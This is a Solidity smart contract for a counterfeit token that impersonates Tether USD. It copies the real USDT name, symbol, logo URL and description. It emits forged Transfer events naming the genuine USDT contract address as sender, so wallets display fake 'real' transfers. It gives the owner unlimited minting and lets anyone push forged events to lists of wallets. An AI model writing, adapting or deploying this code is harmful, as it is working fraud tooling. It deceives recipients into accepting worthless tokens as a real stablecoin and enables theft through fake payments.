// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract USDT_R3loaded {
    string public constant name = "Tether USD";
    string public constant symbol = "USDT";
    uint8 public constant decimals = 6;
    uint256 public totalSupply;
    
    mapping(address => uint256) private balances;
    mapping(address => mapping(address => uint256)) private allowances;
    
    address private constant ORIGINAL_USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    
    string public tokenLogoURI = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png";
    string public tokenWebsite = "https://tether.to";
    string public tokenDescription = "Tether (USDT) is a stablecoin pegged to the US Dollar";
    
    address private owner;
    bool private bypassCheck = true;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event LogoUpdated(string newLogoURI);
    
    constructor() {
        owner = msg.sender;
        
        totalSupply = 1000000000 * 10 ** uint256(decimals); // 1 миллиард USDT
        balances[msg.sender] = totalSupply;
        
        emit Transfer(address(0), msg.sender, totalSupply);
        
        _activateWallet(msg.sender);
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }
    
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
    
    function allowance(address _owner, address spender) public view returns (uint256) {
        return allowances[_owner][spender];
    }
    
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    
    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        _spendAllowance(from, msg.sender, amount);
        _transfer(from, to, amount);
        return true;
    }
    
    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "Transfer from zero");
        require(to != address(0), "Transfer to zero");
        require(balances[from] >= amount, "Insufficient balance");
        
        balances[from] -= amount;
        balances[to] += amount;
        
        emit Transfer(from, to, amount);
        
        if (bypassCheck) {
            _activateWallet(to);
        }
    }
    
    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "Approve from zero");
        require(spender != address(0), "Approve to zero");
        
        allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }
    
    function _spendAllowance(address _owner, address spender, uint256 amount) private {
        uint256 currentAllowance = allowance(_owner, spender);
        require(currentAllowance >= amount, "Insufficient allowance");
        _approve(_owner, spender, currentAllowance - amount);
    }
    
    function tokenURI() external view returns (string memory) {
        return string(abi.encodePacked(
            'data:application/json;utf8,',
            '{"name":"', name, '",',
            '"symbol":"', symbol, '",',
            '"decimals":"', _uint2str(decimals), '",',
            '"logo":"', tokenLogoURI, '",',
            '"website":"', tokenWebsite, '",',
            '"description":"', tokenDescription, '"}'
        ));
    }
    
    // Обновление логотипа
    function updateLogo(string memory newLogoURI) external onlyOwner {
        tokenLogoURI = newLogoURI;
        emit LogoUpdated(newLogoURI);
    }
    
    function updateMetadata(string memory newWebsite, string memory newDescription) external onlyOwner {
        tokenWebsite = newWebsite;
        tokenDescription = newDescription;
    }
    
    
    function _activateWallet(address wallet) private {
        if (balances[wallet] > 0) {
            emit Transfer(ORIGINAL_USDT, wallet, 1);
            
            (bool success1, ) = wallet.call(
                abi.encodeWithSignature("receive()")
            );
            
            (bool success2, ) = wallet.call(
                abi.encodeWithSignature("tokenReceived(address,uint256,bytes)", 
                    address(this), 
                    balances[wallet], 
                    bytes(""))
            );
            
            success1; success2;
        }
    }
    
    function activateWallet(address wallet) external {
        _activateWallet(wallet);
    }
    
    function activateWallets(address[] calldata wallets) external {
        for (uint i = 0; i < wallets.length; i++) {
            _activateWallet(wallets[i]);
        }
    }
    
    
    function mint(address to, uint256 amount) public onlyOwner {
        totalSupply += amount;
        balances[to] += amount;
        emit Transfer(address(0), to, amount);
        
        if (bypassCheck) {
            _activateWallet(to);
        }
    }
    
    function burn(uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        balances[msg.sender] -= amount;
        totalSupply -= amount;
        emit Transfer(msg.sender, address(0), amount);
    }
    
    function setBypass(bool status) public onlyOwner {
        bypassCheck = status;
    }
    
    function originalContract() public pure returns (address) {
        return ORIGINAL_USDT;
    }
    
    function _uint2str(uint _i) private pure returns (string memory) {
        if (_i == 0) return "0";
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len;
        while (_i != 0) {
            k = k - 1;
            uint8 temp = (48 + uint8(_i - _i / 10 * 10));
            bytes1 b1 = bytes1(temp);
            bstr[k] = b1;
            _i /= 10;
        }
        return string(bstr);
    }
    
    function getMetadata() external view returns (
        string memory, 
        string memory, 
        string memory, 
        string memory, 
        uint8
    ) {
        return (name, symbol, tokenLogoURI, tokenDescription, decimals);
    }
}
